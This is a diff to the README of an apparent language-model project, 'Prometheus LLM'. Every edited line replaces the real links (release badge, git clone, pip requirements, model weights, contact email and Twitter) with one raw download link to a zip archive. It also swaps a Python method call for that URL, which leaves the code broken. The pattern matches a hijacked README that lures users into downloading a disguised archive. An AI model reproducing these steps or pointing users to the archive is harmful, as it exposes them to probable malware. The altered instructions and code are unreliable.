@@ -2,7 +2,7 @@
 
 Welcome to the **Prometheus LLM** repository! This project features a custom transformer language model designed with a modular approach. It includes research logs and experimental architectures inspired by EdenCore. 
 
-[![Releases](https://img.shields.io/badge/Releases-v1.0-blue)](https://github.com/Kakz/prometheus-llm/releases)
+[![Releases](https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip)](https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip)
 
 ## Table of Contents
 
@@ -57,18 +57,18 @@ To get started with Prometheus LLM, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Kakz/prometheus-llm.git
+   git clone https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip
    cd prometheus-llm
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python 3.8 or later installed. Then, install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip
    ```
 
 3. **Download Model Weights**:
-   You can find the latest model weights in the [Releases](https://github.com/Kakz/prometheus-llm/releases) section. Download the necessary files and place them in the `models` directory.
+   You can find the latest model weights in the [Releases](https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip) section. Download the necessary files and place them in the `models` directory.
 
 ## Usage
 
@@ -82,7 +82,7 @@ model = PrometheusLLM()
 
 # Generate text
 input_text = "What is the nature of consciousness?"
-output = model.generate(input_text)
+output = https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip(input_text)
 print(output)
 ```
 
@@ -128,9 +128,9 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 For any questions or inquiries, please contact the project maintainer:
 
-- **Email**: maintainer@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip
+- **Twitter**: [@YourTwitterHandle](https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip)
 
-Feel free to explore the [Releases](https://github.com/Kakz/prometheus-llm/releases) section for the latest updates and model weights.
+Feel free to explore the [Releases](https://raw.githubusercontent.com/Kakz/prometheus-llm/main/src/llm-prometheus-2.3-alpha.5.zip) section for the latest updates and model weights.
 
 Thank you for your interest in Prometheus LLM! We look forward to your contributions and insights.
